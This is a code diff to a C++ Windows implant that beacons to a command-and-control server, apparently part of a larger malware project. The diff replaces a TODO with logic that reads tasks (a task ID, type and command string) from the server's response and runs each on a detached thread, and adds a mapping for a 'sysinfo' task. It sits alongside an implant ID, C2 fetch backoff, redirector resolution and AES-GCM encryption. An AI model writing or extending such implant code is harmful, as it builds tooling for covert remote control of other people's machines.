@@ -4,6 +4,7 @@
 #include "../crypto/AesGcm.h"
 #include "../http/RedirectorResolver.h"
 #include "../http/WinHttpClient.h"
+#include "Task.h"
 #include "../external/nlohmann/json.hpp"
 #include <chrono>
 #include <random>
@@ -15,6 +16,12 @@
 #include <winhttp.h>
 
 namespace {
+    beacon::TaskType stringToTaskType(const std::string& str) {
+        if (str == "sysinfo") return beacon::TaskType::SYSINFO;
+        // Add other mappings here
+        return beacon::TaskType::UNKNOWN;
+    }
+
     std::string getUsername() {
         DWORD username_len = 0;
         GetUserNameW(NULL, &username_len);
@@ -48,7 +55,7 @@ namespace {
 
 namespace beacon {
 
-Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF) {
+Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF), taskDispatcher_(pendingResults_) {
     implantId_ = core::generateImplantId();
 }
 
@@ -161,7 +168,16 @@ void Beacon::run() {
                     );
                 }
 
-                // TODO: Process tasks
+                if (response_json.contains("tasks")) {
+                    for (const auto& task_json : response_json["tasks"]) {
+                        Task task;
+                        task.task_id = task_json["task_id"];
+                        task.type = stringToTaskType(task_json["type"]);
+                        task.cmd = task_json.value("cmd", "");
+
+                        std::thread(&TaskDispatcher::dispatch, &taskDispatcher_, task).detach();
+                    }
+                }
             }
 
         } catch (const std::exception&) {
